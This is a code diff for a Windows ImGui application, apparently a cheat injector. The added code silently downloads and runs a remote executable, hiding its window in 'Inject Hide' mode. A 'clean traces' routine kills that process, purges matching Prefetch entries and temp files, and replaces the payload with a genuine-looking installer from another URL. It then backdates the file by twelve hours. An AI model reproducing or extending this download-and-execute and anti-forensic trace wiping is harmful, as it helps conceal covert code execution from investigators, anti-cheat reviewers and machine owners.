+    const bool exists = FileExistsOnDisk(fullPath);
+    const bool isReal = exists && IsRealBySize(fullPath);
+    const bool isFakeOk = exists && !isReal && IsInstallerValid(fullPath);
+    const bool alreadyCached = isFakeOk;
+
+    if (alreadyCached)
+        ::InterlockedExchange(&g_installerWasCached, 1);
+    else if (exists) {
+        ::SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
+        ::DeleteFileW(fullPath.c_str());
+    }
+
+    if (!alreadyCached) {
+        if (!DownloadFileToDisk(kInstallerUrl, fullPath)) {
+            ::DeleteFileW(fullPath.c_str());
+            ::InterlockedExchange(&g_installerFailed, 1);
+            ::InterlockedExchange(&g_installerDone, 1);
+            return 0;
+        }
+
+        if (!IsInstallerValid(fullPath)) {
+            ::DeleteFileW(fullPath.c_str());
+            ::InterlockedExchange(&g_installerFailed, 1);
+            ::InterlockedExchange(&g_installerDone, 1);
+            return 0;
+        }
+    }
+
+    const bool alreadyRunning = ProcessRunningByName(kInstallerFile);
+    if (alreadyRunning) {
+        ::InterlockedExchange(&g_installerHadRunning, 1);
+    }
+    else {
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi = {};
+        std::wstring cmdLine = L"\"" + fullPath + L"\"";
+
+        DWORD flags = 0;
+        if (s_injectingMode == 0)
+            flags = CREATE_NO_WINDOW;
+
+        if (!::CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, FALSE,
+            flags, nullptr, dir.c_str(), &si, &pi)) {
+            ::DeleteFileW(fullPath.c_str());
+            ::InterlockedExchange(&g_installerFailed, 1);
+            ::InterlockedExchange(&g_installerDone, 1);
+            return 0;
+        }
+        ::CloseHandle(pi.hThread);
+        ::CloseHandle(pi.hProcess);
+    }
+
+    ::Sleep(2500);
+    ::InterlockedExchange(&g_installerSlept, 1);
+    ::InterlockedExchange(&g_installerDone, 1);
+    return 0;
+}
+
+static void LaunchInstallerAsync() {
+    ::InterlockedExchange(&g_installerWasCached, 0);
+    ::InterlockedExchange(&g_installerHadRunning, 0);
+    ::InterlockedExchange(&g_installerDone, 0);
+    ::InterlockedExchange(&g_installerFailed, 0);
+    ::InterlockedExchange(&g_installerSlept, 0);
+
+    HANDLE h = (HANDLE)_beginthreadex(nullptr, 0, InstallerThreadProc, nullptr, 0, nullptr);
+    if (h) ::CloseHandle(h);
+}
+
+static unsigned __stdcall CleanThreadProc(void*) {
+    std::wstring dir(kInstallerDir);
+    std::wstring fullPath = dir + L"\\" + kInstallerFile;
+
+    ::InterlockedExchange(&g_cleanStage, 0);
+    ::InterlockedExchange(&g_cleanFound, 0);
+
+    KillProcessByNameSoftly(kInstallerFile);
+
+    PurgePrefetchByPrefix(L"KITS CONFIGURATION INSTALLER");
+
+    PurgeRandomTmpFiles();
+
+    if (!EnsureDirectoryExists(dir)) {
+        ::InterlockedExchange(&g_cleanFailed, 1);
+        ::InterlockedExchange(&g_cleanDone, 1);
+        return 0;
+    }
+
+    if (FileExistsOnDisk(fullPath)) {
+        ::SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
+        ::DeleteFileW(fullPath.c_str());
+    }
+
+    ::InterlockedExchange(&g_cleanStage, 1);
+
+    if (!DownloadFileToDisk(kInstallerRealUrl, fullPath)) {
+        ::InterlockedExchange(&g_cleanFailed, 1);
+        ::InterlockedExchange(&g_cleanDone, 1);
+        return 0;
+    }
+
+    if (!IsInstallerValid(fullPath)) {
+        ::DeleteFileW(fullPath.c_str());
+        ::InterlockedExchange(&g_cleanFailed, 1);
+        ::InterlockedExchange(&g_cleanDone, 1);
+        return 0;
+    }
+
+    BackdateFile12Hours(fullPath);
+
+    ::InterlockedExchange(&g_cleanFound, 1);
+    ::InterlockedExchange(&g_cleanZeroFilled, 1);
+    ::InterlockedExchange(&g_cleanStage, 3);
+    ::InterlockedExchange(&g_cleanDone, 1);
+    return 0;
+}
+
+static void CleanTracesAsync() {
+    ::InterlockedExchange(&g_cleanStage, 0);
+    ::InterlockedExchange(&g_cleanFound, 0);
+    ::InterlockedExchange(&g_cleanZeroFilled, 0);
+    ::InterlockedExchange(&g_cleanDone, 0);
+    ::InterlockedExchange(&g_cleanFailed, 0);
+
+    HANDLE h = (HANDLE)_beginthreadex(nullptr, 0, CleanThreadProc, nullptr, 0, nullptr);
+    if (h) ::CloseHandle(h);
 }
 
 bool InRect(const ImVec2& p, const ImVec2& a, const ImVec2& b) {
@@ -281,7 +780,6 @@ bool CreateDeviceD3D(HWND hWnd) {
     D3D_FEATURE_LEVEL featureLevel;
     const D3D_FEATURE_LEVEL levels[] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0 };
 
-    // Antisserrilhamento: tenta MSAA 4x; se o driver recusar, volta para 1x
     HRESULT hr = DXGI_ERROR_UNSUPPORTED;
     for (UINT msaa = 4; msaa >= 1; msaa = (msaa == 4 ? 1 : 0)) {
         sd.SampleDesc.Count = msaa;
@@ -344,7 +842,7 @@ LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         if ((wParam & 0xfff0) == SC_KEYMENU) return 0;
         break;
     case WM_KEYDOWN:
-        if (wParam == VK_ESCAPE) { ::PostQuitMessage(0); return 0; } // ESC fecha
+        if (wParam == VK_ESCAPE) { ::PostQuitMessage(0); return 0; }
         break;
     case WM_DESTROY:
         ::PostQuitMessage(0);
@@ -382,31 +880,19 @@ void HandleDrag(HWND hWnd, const ImVec2& p, const ImVec2& q, const ImVec2& bp, c
     ::SetWindowPos(hWnd, nullptr, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
 }
 
-// ---------------------------------------------------------------------------
-// Botão Power estilo controle de TV: círculo com símbolo de energia, sempre
-// branco. No hover ele desliza para a esquerda (expandindo um "pill") com
-// suavidade, mostrando o rótulo "Unload". Tem backlight atrás do botão e
-// claridade (glow) no ícone e no nome. Clique fecha o programa.
-// ---------------------------------------------------------------------------
-static float s_pillAnim = 0.0f; // 0 = círculo, 1 = pill aberto
-
 static float Clamp01(float x) { return x < 0.0f ? 0.0f : (x > 1.0f ? 1.0f : x); }
 static float EaseSmooth(float x) { return x * x * (3.0f - 2.0f * x); }
 
-// Evita saltos nas animações no primeiro frame (criação do atlas/shaders pode
-// deixar o DeltaTime inicial muito alto em algumas máquinas/drivers).
 static float AnimDeltaTime() {
     return fminf(ImGui::GetIO().DeltaTime, 1.0f / 30.0f);
 }
 
-// Texto com leve "claridade": halo BEM sutil ao redor + texto nítido por cima.
-// Deslocamento mínimo (0.5px) e alpha baixo para NÃO parecer contorno grosso.
 static void DrawTextGlow(ImDrawList* draw, ImFont* font, float size, const ImVec2& pos,
     ImU32 col, const char* text) {
     const int colA = (int)((col >> 24) & 0xFF);
-    const int haloA = (colA * 14) / 100; // halo fraco (~14% do alpha do texto)
+    const int haloA = (colA * 14) / 100;
     const ImU32 halo = (col & 0x00FFFFFF) | ((ImU32)haloA << 24);
-    static const float offs[4][2] = {   // só 4 amostras, deslocamento de 0.5px
+    static const float offs[4][2] = {
         { 0.5f, 0.0f }, { -0.5f, 0.0f }, { 0.0f, 0.5f }, { 0.0f, -0.5f }
     };
     for (int i = 0; i < 4; ++i)
@@ -414,194 +900,140 @@ static void DrawTextGlow(ImDrawList* draw, ImFont* font, float size, const ImVec
     draw->AddText(font, size, pos, col, text);
 }
 
-void DrawPowerButton(ImDrawList* draw, const ImVec2& p, const ImVec2& q,
-    ImVec2& exMin, ImVec2& exMax) {
+void DrawWindowButtons(ImDrawList* draw, const ImVec2& p, const ImVec2& q,
+    HWND hWnd, ImVec2& exMin, ImVec2& exMax) {
     const float radius = 14.0f;
     const float margin = 10.0f;
-    const float cy = p.y + margin + radius;      // centro vertical
-    const float xRight = q.x - margin;           // borda direita do pill (fixa)
+    const float gap = 12.0f;
+    const float cy = p.y + margin + radius;
 
-    // Métricas do rótulo "Unload" (Arial Bold)
-    ImFont* textFont = g_fontText ? g_fontText : ImGui::GetFont();
-    const char* label = "Unload";
-    const ImVec2 ts = textFont->CalcTextSizeA(kLabelSize, FLT_MAX, 0.0f, label);
+    const float closeCx = q.x - margin - radius;
+    const float minCx = closeCx - radius * 2.0f - gap;
 
-    const float pillWCollapsed = radius * 2.0f;                       // só o círculo
-    const float pillWExpanded = pillWCollapsed + 8.0f + ts.x + 14.0f; // + rótulo
+    static float s_closeAnim = 0.0f;
+    static float s_minAnim = 0.0f;
 
-    // Área de clique usa a largura do frame anterior (evita flicker)
-    const float pillWPrev = pillWCollapsed + (pillWExpanded - pillWCollapsed) * EaseSmooth(s_pillAnim);
-    const ImVec2 pillMinPrev(xRight - pillWPrev, cy - radius);
-    ImGui::SetCursorScreenPos(pillMinPrev);
-    ImGui::InvisibleButton("##power", ImVec2(pillWPrev, radius * 2.0f));
-    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
-
-    if (ImGui::IsItemClicked())
-        g_running = false; // power fecha o programa
-
-    // Animação: só um deslizar para a esquerda, com suavidade (smoothstep)
-    const float dt = AnimDeltaTime();
-    const float target = hovered ? 1.0f : 0.0f;
-    if (s_pillAnim < target) {
-        s_pillAnim += dt * 4.0f; // expansão mais lenta
-        if (s_pillAnim > 1.0f) s_pillAnim = 1.0f;
-    }
-    else if (s_pillAnim > target) {
-        s_pillAnim -= dt * 8.0f;
-        if (s_pillAnim < 0.0f) s_pillAnim = 0.0f;
-    }
-
-    const float t = EaseSmooth(s_pillAnim);
-    const float pillW = pillWCollapsed + (pillWExpanded - pillWCollapsed) * t;
-    const ImVec2 pillMin(xRight - pillW, cy - radius);
-    const ImVec2 pillMax(xRight, cy + radius);
-    const ImVec2 iconCenter(pillMin.x + radius, cy);
-
-    exMin = pillMin; // área excluída do drag
-    exMax = pillMax;
-
-    // --- Sombra simples embaixo do pill ---
-    draw->AddRectFilled(ImVec2(pillMin.x, pillMin.y + 1.5f),
-        ImVec2(pillMax.x, pillMax.y + 1.5f),
-        IM_COL32(0, 0, 0, 120), radius);
-
-    // --- Backlight ATRÁS do botão: camadas translúcidas cada vez menores;
-    //     o corpo opaco cobre o centro e sobra só o halo suave ao redor. ---
     {
-        const int base = hovered ? 12 : 6; // brilho baixo: halo bem sutil
-        for (int i = 3; i >= 1; --i) {
-            const float g = (float)i * 2.5f;
-            draw->AddRectFilled(ImVec2(pillMin.x - g, pillMin.y - g),
-                ImVec2(pillMax.x + g, pillMax.y + g),
-                IM_COL32(255, 255, 255, base / i), radius + g);
+        ImGui::SetCursorScreenPos(ImVec2(minCx - radius, cy - radius));
+        ImGui::InvisibleButton("##minimize", ImVec2(radius * 2.0f, radius * 2.0f));
+        const bool hovered = ImGui::IsItemHovered() && !s_dragging;
+        if (ImGui::IsItemClicked())
+            ::ShowWindow(hWnd, SW_MINIMIZE);
+
+        const float dt = AnimDeltaTime();
+        const float target = hovered ? 1.0f : 0.0f;
+        if (s_minAnim < target) s_minAnim = fminf(target, s_minAnim + dt * 8.0f);
+        else                    s_minAnim = fmaxf(target, s_minAnim - dt * 10.0f);
+
+        const float t = EaseSmooth(s_minAnim);
+        const ImVec2 c(minCx, cy);
+
+        const float halfW = radius * 0.55f;
+        const float thick = 2.0f;
+
+        const int bright = (int)(180.0f + 75.0f * t);
+        const ImU32 col = IM_COL32(bright, bright, bright, 255);
+
+        if (t > 0.01f) {
+            for (int i = 3; i >= 1; --i) {
+                const float g = (float)i * 0.8f;
+                const ImU32 halo = IM_COL32(255, 255, 255, (int)(22.0f * t / (float)i));
+                draw->AddLine(ImVec2(c.x - halfW, c.y + g),
+                    ImVec2(c.x + halfW, c.y + g), halo, thick + g * 2.0f);
+            }
         }
+
+        draw->AddLine(ImVec2(c.x - halfW, c.y),
+            ImVec2(c.x + halfW, c.y), col, thick);
+        draw->AddCircleFilled(ImVec2(c.x - halfW, c.y), thick * 0.5f, col);
+        draw->AddCircleFilled(ImVec2(c.x + halfW, c.y), thick * 0.5f, col);
     }
 
-    // --- Corpo (plástico escuro). Largura 2r + rounding r = círculo perfeito. ---
-    // Mesma cor personalizada usada no header e no Stream Proof.
-    const ImU32 face = hovered
-        ? IM_COL32(18, 19, 23, 255)
-        : IM_COL32(12, 13, 16, 255);
-    draw->AddRectFilled(pillMin, pillMax, face, radius);
-
-    // --- Borda ---
-    const ImU32 rim = hovered ? IM_COL32(255, 255, 255, 140) : IM_COL32(85, 85, 85, 255);
-    draw->AddRect(pillMin, pillMax, rim, radius, 0, 1.5f);
-
-    // --- Ícone de energia com claridade (halo branco + glifo nítido) ---
     {
-        ImFont* iconFont = g_fontIcons ? g_fontIcons : ImGui::GetFont();
-        const float iconSize = g_fontIcons ? kIconSize : ImGui::GetFontSize();
-        const ImVec2 its = iconFont->CalcTextSizeA(iconSize, FLT_MAX, 0.0f, ICON_FA_POWER_OFF);
-        const ImVec2 ipos(iconCenter.x - its.x * 0.5f, iconCenter.y - its.y * 0.5f);
-        DrawTextGlow(draw, iconFont, iconSize, ipos, IM_COL32(255, 255, 255, 255), ICON_FA_POWER_OFF);
-    }
+        ImGui::SetCursorScreenPos(ImVec2(closeCx - radius, cy - radius));
+        ImGui::InvisibleButton("##close", ImVec2(radius * 2.0f, radius * 2.0f));
+        const bool hovered = ImGui::IsItemHovered() && !s_dragging;
+        if (ImGui::IsItemClicked())
+            g_running = false;
 
-    // --- Rótulo "Unload": posição final FIXA, fade suave no fim do slide ---
-    {
-        const float labelT = EaseSmooth(Clamp01((s_pillAnim - 0.60f) / 0.40f));
-        if (labelT > 0.0f) {
-            const float textX = xRight - 14.0f - ts.x;
-            const float textY = cy - ts.y * 0.5f;
-            draw->PushClipRect(pillMin, pillMax);
-            DrawTextGlow(draw, textFont, kLabelSize, ImVec2(textX, textY),
-                IM_COL32(255, 255, 255, (int)(255.0f * labelT)), label);
-            draw->PopClipRect();
+        const float dt = AnimDeltaTime();
+        const float target = hovered ? 1.0f : 0.0f;
+        if (s_closeAnim < target) s_closeAnim = fminf(target, s_closeAnim + dt * 8.0f);
+        else                      s_closeAnim = fmaxf(target, s_closeAnim - dt * 10.0f);
+
+        const float t = EaseSmooth(s_closeAnim);
+        const ImVec2 c(closeCx, cy);
+
+        const float xr = radius * 0.42f;
+        const float thick = 2.0f;
+
+        const int bright = (int)(180.0f + 75.0f * t);
+        const ImU32 col = IM_COL32(bright, bright, bright, 255);
+
+        const ImVec2 a0(c.x - xr, c.y - xr);
+        const ImVec2 a1(c.x + xr, c.y + xr);
+        const ImVec2 b0(c.x - xr, c.y + xr);
+        const ImVec2 b1(c.x + xr, c.y - xr);
+
+        if (t > 0.01f) {
+            for (int i = 3; i >= 1; --i) {
+                const float g = (float)i * 0.6f;
+                const ImU32 halo = IM_COL32(255, 255, 255, (int)(22.0f * t / (float)i));
+                draw->AddLine(ImVec2(a0.x - g, a0.y), ImVec2(a1.x - g, a1.y), halo, thick + g * 2.0f);
+                draw->AddLine(ImVec2(a0.x + g, a0.y), ImVec2(a1.x + g, a1.y), halo, thick + g * 2.0f);
+                draw->AddLine(ImVec2(a0.x, a0.y - g), ImVec2(a1.x, a1.y - g), halo, thick + g * 2.0f);
+                draw->AddLine(ImVec2(a0.x, a0.y + g), ImVec2(a1.x, a1.y + g), halo, thick + g * 2.0f);
+            }
         }
+
+        draw->AddLine(a0, a1, col, thick);
+        draw->AddLine(b0, b1, col, thick);
+
+        draw->AddCircleFilled(a0, thick * 0.5f, col);
+        draw->AddCircleFilled(a1, thick * 0.5f, col);
+        draw->AddCircleFilled(b0, thick * 0.5f, col);
+        draw->AddCircleFilled(b1, thick * 0.5f, col);
     }
 
-    ImGui::SetMouseCursor(ImGuiMouseCursor_Arrow); // cursor padrão, sempre
+    exMin = ImVec2(minCx - radius, cy - radius);
+    exMax = ImVec2(closeCx + radius, cy + radius);
+
+    ImGui::SetMouseCursor(ImGuiMouseCursor_Arrow);
 }
 
-// ---------------------------------------------------------------------------
-// Botão de INJECT do card direito — é o ÚNICO controle do card:
-//
-//              [  Inject Hide  |  (o->)  ]
-//                   245 x 40 px
-//
-// O botão tem DUAS zonas de clique:
-//   - SÍMBOLO (faixa da direita): ALTERNA a seleção entre "Inject Hide" e
-//     "Inject Normal" (o rótulo velho sai por cima, o novo entra por baixo, e
-//     o símbolo dá meia volta como feedback).
-//   - RESTO do botão: DISPARA o inject do modo selecionado, abre o MENU de
-//     progresso (spinner + etapa) e trava o botão por 4s mostrando
-//     "Inject Hide..." / "Inject Normal...".
-//
-// Hover: um CÍRCULO branco nasce no CENTRO do botão e cresce até cobrir tudo
-// (nos dois eixos, voltando ao centro quando o mouse sai); o rótulo e o
-// símbolo invertem de cor conforme o branco passa por baixo.
-// ---------------------------------------------------------------------------
-static int   s_injectMode = 0;      // 0 = "Inject Hide" | 1 = "Inject Normal"
-static int   s_injectPrev = 0;      // modo anterior durante a animação
-static float s_injectAnim = 1.0f;   // 0..1 (1 = animação concluída)
+static int   s_injectMode = 0;
+static int   s_injectPrev = 0;
+static float s_injectAnim = 1.0f;
 static const char* kInjectLabels[2] = { "Inject Hide", "Inject Normal" };
-static float s_injectSheen = 0.0f;  // animação do reflexo no hover do botão  // fade do reflexo animado no hover
-static float s_injectBusy = 0.0f;   // segundos restantes de trava (0 = livre)
-static int   s_injectingMode = 0;   // modo que está sendo injetado agora
+static float s_injectSheen = 0.0f;
 
-// Estado independente do botão de limpeza.
-static int   s_cleanMode = 0;       // 0 = Full Traces | 1 = Traces
+static int   s_cleanMode = 0;
 static int   s_cleanPrev = 0;
 static float s_cleanAnim = 1.0f;
 static float s_cleanSheen = 0.0f;
-static float s_cleanBusy = 0.0f;
-static int   s_cleaningMode = 0;
 static const char* kCleanLabels[2] = { "Clean Full Traces", "Clean Traces" };
 
-// Checkbox personalizado "Stream Proof" do card Features.
-static bool  s_streamProof = false;
-static float s_streamProofAnim = 0.0f;
-static float s_streamProofHover = 0.0f;
-
-// Menu de progresso (abre no clique de disparo e dura o mesmo tempo da trava)
-static const float kInjectWorkTime = 4.0f;   // duração (s): menu = trava do botão
+static bool  s_injectActive = false;
+static float s_injectElapsed = 0.0f;
+static float s_injectPostDone = 0.0f;
+static const float kInjectPostDoneGrace = 3.0f;
 static bool  s_menuOpen = false;
-static float s_menuT = 0.0f;                 // tempo desde a abertura (s)
 
-// Maior tamanho de fonte (<= maxSize) que faz o texto caber na largura dada.
+static bool  s_cleanActive = false;
+static float s_cleanElapsed = 0.0f;
+static float s_cleanPostDone = 0.0f;
+static const float kCleanPostDoneGrace = 3.0f;
+static bool  s_cleanMenuOpen = false;
+
 static float FitTextSize(ImFont* font, const char* text, float maxSize, float availW) {
     const float w = font->CalcTextSizeA(maxSize, FLT_MAX, 0.0f, text).x;
     if (w <= availW || w <= 0.0f) return maxSize;
     return maxSize * (availW / w);
 }
 
-// ---------------------------------------------------------------------------
-// Inversão de cor pela cortina CIRCULAR: o ImGui só tem clip retangular, então
-// o miolo claro/círculo é aproximado por FAIXAS de 1px de altura (mesma técnica
-// da máscara dos cantos do header). `paint(cor)` desenha o conteúdo.
-//   1) pinta tudo na cor clara (fora do círculo)
-//   2) repinta na cor escura, faixa por faixa, dentro do círculo
-// ---------------------------------------------------------------------------
-template <typename PaintFn>
-static void RevealByCircle(ImDrawList* draw, const ImVec2& c, float radius,
-    const ImVec2& bMin, const ImVec2& bMax, PaintFn paint) {
-    draw->PushClipRect(bMin, bMax, true);
-    paint(IM_COL32(255, 255, 255, 255));
-    draw->PopClipRect();
-
-    if (radius <= 0.5f) return;
-    const int y0 = (int)floorf(fmaxf(bMin.y, c.y - radius));
-    const int y1 = (int)ceilf(fminf(bMax.y, c.y + radius));
-    for (int y = y0; y < y1; ++y) {
-        const float dy = ((float)y + 0.5f) - c.y;
-        const float r2 = radius * radius - dy * dy;
-        if (r2 <= 0.0f) continue;
-        const float dx = sqrtf(r2);
-        const float x0 = fmaxf(c.x - dx, bMin.x);
-        const float x1 = fminf(c.x + dx, bMax.x);
-        if (x1 <= x0) continue;
-        draw->PushClipRect(ImVec2(x0, (float)y), ImVec2(x1, (float)y + 1.0f), true);
-        paint(IM_COL32(12, 12, 14, 255));
-        draw->PopClipRect();
-    }
-}
-
-// ---------------------------------------------------------------------------
-// Spinner do menu: um arco de 270° girando.
-// ---------------------------------------------------------------------------
 static void DrawSpinner(ImDrawList* draw, const ImVec2& c, float r, float phase, ImU32 col) {
     const int   seg = 28;
-    const float kSpan = 4.712389f;          // 270°
+    const float kSpan = 4.712389f;
     ImVec2 pts[seg + 1];
     for (int i = 0; i <= seg; ++i) {
         const float a = phase + kSpan * ((float)i / (float)seg);
@@ -610,19 +1042,11 @@ static void DrawSpinner(ImDrawList* draw, const ImVec2& c, float r, float phase,
     draw->AddPolyline(pts, seg + 1, col, 0, 2.0f);
 }
 
-// ---------------------------------------------------------------------------
-// Símbolo de ALTERNAR: dois arcos opostos, cada um com uma ponta de seta no
-// fim. Desenhado à mão (arcos amostrados + triângulos) em vez de usar um glifo
-// de fonte: fica nítido nesse tamanho e gira no próprio centro.
-// rot = rotação em radianos (o símbolo tem simetria de 180°, então terminar em
-// PI deixa o desenho idêntico ao inicial — nada de "pulo" no fim).
-// ---------------------------------------------------------------------------
 static void DrawSwapIcon(ImDrawList* draw, const ImVec2& c, float r, ImU32 col, float rot) {
-    const float kSpan = 112.0f * 0.0174533f;   // abertura de cada arco (rad)
-    // 180-112 = 68° de vão entre as duas partes
-    const float kHead = 2.6f;                  // tamanho da ponta de seta
-    const float kThick = 1.5f;                 // espessura do arco
-    const int   kSeg = 12;                     // segmentos por arco
+    const float kSpan = 112.0f * 0.0174533f;
+    const float kHead = 2.6f;
+    const float kThick = 1.5f;
+    const int   kSeg = 12;
 
     for (int k = 0; k < 2; ++k) {
         const float a0 = rot + (float)k * 3.14159265f;
@@ -634,11 +1058,10 @@ static void DrawSwapIcon(ImDrawList* draw, const ImVec2& c, float r, ImU32 col, 
         }
         draw->AddPolyline(pts, kSeg + 1, col, 0, kThick);
 
-        // Ponta de seta no fim do arco, seguindo a tangente do movimento
         const float a1 = a0 + kSpan;
         const ImVec2 p(c.x + cosf(a1) * r, c.y + sinf(a1) * r);
-        const ImVec2 tg(-sinf(a1), cosf(a1));   // direção do movimento
-        const ImVec2 nr(cosf(a1), sinf(a1));    // normal (radial)
+        const ImVec2 tg(-sinf(a1), cosf(a1));
+        const ImVec2 nr(cosf(a1), sinf(a1));
         const ImVec2 apex(p.x + tg.x * kHead * 1.15f, p.y + tg.y * kHead * 1.15f);
         const ImVec2 b1(p.x + nr.x * kHead * 0.62f, p.y + nr.y * kHead * 0.62f);
         const ImVec2 b2(p.x - nr.x * kHead * 0.62f, p.y - nr.y * kHead * 0.62f);
@@ -646,51 +1069,6 @@ static void DrawSwapIcon(ImDrawList* draw, const ImVec2& c, float r, ImU32 col, 
     }
 }
 
-// Preenche somente a interseção entre um círculo e um retângulo arredondado.
-// PushClipRect recorta apenas em formato retangular e era justamente o que
-// deixava as pontas quadradas durante o hover.
-static void AddCircleClippedToRoundedRect(ImDrawList* draw, const ImVec2& center,
-    float circleRadius, const ImVec2& mn, const ImVec2& mx, float rounding, ImU32 col) {
-    if (circleRadius <= 0.0f) return;
-
-    const int y0 = (int)floorf(fmaxf(mn.y, center.y - circleRadius));
-    const int y1 = (int)ceilf(fminf(mx.y, center.y + circleRadius));
-    const float topCY = mn.y + rounding;
-    const float botCY = mx.y - rounding;
-
-    for (int y = y0; y < y1; ++y) {
-        const float py = (float)y + 0.5f;
-        const float cdy = py - center.y;
-        const float circleR2 = circleRadius * circleRadius - cdy * cdy;
-        if (circleR2 <= 0.0f) continue;
-
-        const float circleDX = sqrtf(circleR2);
-        float rx0 = mn.x;
-        float rx1 = mx.x;
-
-        // Limites horizontais do retângulo arredondado nesta linha.
-        if (rounding > 0.0f && py < topCY) {
-            const float dy = topCY - py;
-            const float dx = sqrtf(fmaxf(0.0f, rounding * rounding - dy * dy));
-            rx0 = mn.x + rounding - dx;
-            rx1 = mx.x - rounding + dx;
-        }
-        else if (rounding > 0.0f && py > botCY) {
-            const float dy = py - botCY;
-            const float dx = sqrtf(fmaxf(0.0f, rounding * rounding - dy * dy));
-            rx0 = mn.x + rounding - dx;
-            rx1 = mx.x - rounding + dx;
-        }
-
-        const float x0 = fmaxf(center.x - circleDX, rx0);
-        const float x1 = fminf(center.x + circleDX, rx1);
-        if (x1 > x0)
-            draw->AddRectFilled(ImVec2(x0, (float)y), ImVec2(x1, (float)y + 1.0f), col);
-    }
-}
-
-// Reflexo horizontal igual ao dos headers, mas recortado geometricamente no
-// rounding do botão (sem PushClipRect quadrado nos cantos).
 static void AddRoundedSheen(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
     float rounding, float centerX, float halfW, ImU32 rgb, float opacity) {
     if (opacity <= 0.001f || halfW <= 0.0f) return;
@@ -732,97 +1110,56 @@ static void AddRoundedSheen(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx
     }
 }
 
-// ---------------------------------------------------------------------------
-// Cortina do hover: círculo branco que nasce no CENTRO do controle e cresce
-// (nos dois eixos) até cobrir o botão inteiro — inclusive os cantos, por isso o
-// raio final é a MEIA-DIAGONAL do retângulo. Devolve o raio atual, que é o que
-// o rótulo e o símbolo usam para inverter de cor.
-// ---------------------------------------------------------------------------
-static float CortinaCircle(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
-    float round, float& fill, float fillTime, bool active, bool pressed) {
-    const float dt = AnimDeltaTime();
-    fill = Clamp01(fill + (active ? 1.0f : -1.0f) * dt / fillTime);
-    const float t = EaseSmooth(fill);
-
-    if (t > 0.01f) {                       // halo: 3 camadas por fora
-        for (int i = 3; i >= 1; --i) {
-            const float g = (float)i * 1.7f;
-            draw->AddRectFilled(ImVec2(mn.x - g, mn.y - g), ImVec2(mx.x + g, mx.y + g),
-                IM_COL32(255, 255, 255, (int)(t * 40.0f / (float)i)), round + g);
-        }
-    }
-
-    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, 255), round);   // base escura
-
-    const float W = mx.x - mn.x, H = mx.y - mn.y;
-    const float cxm = mn.x + W * 0.5f;     // centro do controle
-    const float cym = mn.y + H * 0.5f;
-    const float halfDiag = sqrtf((W * 0.5f) * (W * 0.5f) + (H * 0.5f) * (H * 0.5f)) + 1.0f;
-    const float radius = halfDiag * t;     // NASCE no centro e abre nos 2 eixos
-
-    if (radius > 0.5f) {
-        // Recorte geométrico real no mesmo raio do botão. Um PushClipRect aqui
-        // produziria pontas quadradas, pois o clip do ImGui não tem rounding.
-        AddCircleClippedToRoundedRect(draw, ImVec2(cxm, cym), radius, mn, mx, round,
-            pressed ? IM_COL32(235, 235, 235, 255) : IM_COL32(255, 255, 255, 255));
-    }
-
-    draw->AddRect(mn, mx, IM_COL32(255, 255, 255, (int)(70 + 175 * t)), round, 0, 1.0f);
-    return radius;
-}
-
 void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
     ImVec2& outMin, ImVec2& outMax) {
-    const float kRound = 6.0f;         // canto redondo
-    const float kSize = 17.0f;         // rótulo (o auto-fit reduz se não couber)
-    const float kIconZone = 20.0f;     // faixa reservada p/ o símbolo (à direita)
-    const float kSwapTime = 0.26f;     // duração da troca animada
-    const float kBlockTime = kInjectWorkTime;   // trava depois de disparar (s)
-    const float kSpinTime = 1.8f;      // volta completa do símbolo enquanto injeta (s)
+    const float kRound = 6.0f;
+    const float kSize = 17.0f;
+    const float kIconZone = 20.0f;
+    const float kSwapTime = 0.26f;
 
-    outMin = mn;                       // área do controle (p/ excluir do drag)
+    outMin = mn;
     outMax = mx;
 
     ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();
 
-    // Trava em andamento? (desconta o tempo; 0 = livre)
-    if (s_injectBusy > 0.0f)
-        s_injectBusy = fmaxf(0.0f, s_injectBusy - AnimDeltaTime());
-    const bool busy = s_injectBusy > 0.0f;
+    if (s_injectActive) {
+        s_injectElapsed += AnimDeltaTime();
+        const bool done = ::InterlockedCompareExchange(&g_installerDone, 0, 0) == 1;
+        if (done) {
+            s_injectPostDone += AnimDeltaTime();
+            if (s_injectPostDone >= kInjectPostDoneGrace) {
+                s_injectActive = false;
+                s_menuOpen = false;
+            }
+        }
+    }
+    const bool busy = s_injectActive;
 
     ImGui::SetCursorScreenPos(mn);
     ImGui::InvisibleButton("##inject", ImVec2(mx.x - mn.x, mx.y - mn.y));
     const bool hovered = ImGui::IsItemHovered() && !s_dragging;
     const bool pressed = hovered && !busy && ImGui::IsMouseDown(ImGuiMouseButton_Left);
 
-    // Zonas: a faixa da direita (kIconZone) é o SÍMBOLO = alterna a seleção;
-    // todo o resto do botão é o DISPARO do inject.
     const bool overIcon = ImGui::GetIO().MousePos.x >= (mx.x - kIconZone);
 
-    // >>> CLIQUE — bloqueado enquanto s_injectBusy estiver rodando
-    if (ImGui::IsItemClicked() && !busy) {
+    if (ImGui::IsItemClicked() && !busy && !s_cleanActive) {
         if (overIcon) {
-            // --- símbolo: ALTERNA a seleção (Hide <-> Normal) ---
-            // Reinicia a animação de troca sem usar máscaras/scissors por pixel.
             s_injectPrev = s_injectMode;
             s_injectMode = 1 - s_injectMode;
             s_injectAnim = 0.0f;
         }
         else {
-            // --- resto do botão: DISPARA o inject do modo selecionado ---
-            s_injectingMode = s_injectMode;   // congela o modo escolhido
-            s_injectBusy = kBlockTime;        // trava o botão por 4s
-            s_menuOpen = true;                // e abre o menu de progresso
-            s_menuT = 0.0f;
-            // TODO: dispara o inject de verdade aqui — use s_injectingMode
-            //       (0 = "Inject Hide", 1 = "Inject Normal") p/ saber qual modo.
+            s_injectingMode = s_injectMode;
+            s_injectActive = true;
+            s_injectElapsed = 0.0f;
